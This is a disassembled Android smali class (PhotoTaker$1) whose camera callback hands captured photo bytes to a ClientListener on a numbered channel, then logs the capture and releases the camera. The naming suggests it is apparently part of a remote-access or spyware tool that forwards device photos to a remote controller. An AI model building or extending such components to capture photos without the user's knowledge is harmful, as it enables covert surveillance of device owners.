.class Lmy/app/Library/PhotoTaker$1;
.super Ljava/lang/Object;
.source "PhotoTaker.java"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/Library/PhotoTaker;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lmy/app/Library/PhotoTaker;


# direct methods
.method constructor <init>(Lmy/app/Library/PhotoTaker;)V
    .locals 0
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    .line 42
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 2
    .parameter "data"
    .parameter "camera"

    .prologue
    .line 46
    iget-object v0, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    iget-object v0, v0, Lmy/app/Library/PhotoTaker;->ctx:Lmy/app/client/ClientListener;

    iget-object v1, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    iget v1, v1, Lmy/app/Library/PhotoTaker;->chan:I

    invoke-virtual {v0, v1, p1}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 47
    const-string v0, "PhotoTaker"

    const-string v1, "After take picture !"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 48
    iget-object v0, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    iget-object v0, v0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 49
    iget-object v0, p0, Lmy/app/Library/PhotoTaker$1;->this$0:Lmy/app/Library/PhotoTaker;

    const/4 v1, 0x0

    iput-object v1, v0, Lmy/app/Library/PhotoTaker;->cam:Landroid/hardware/Camera;

    .line 50
    return-void
.end method
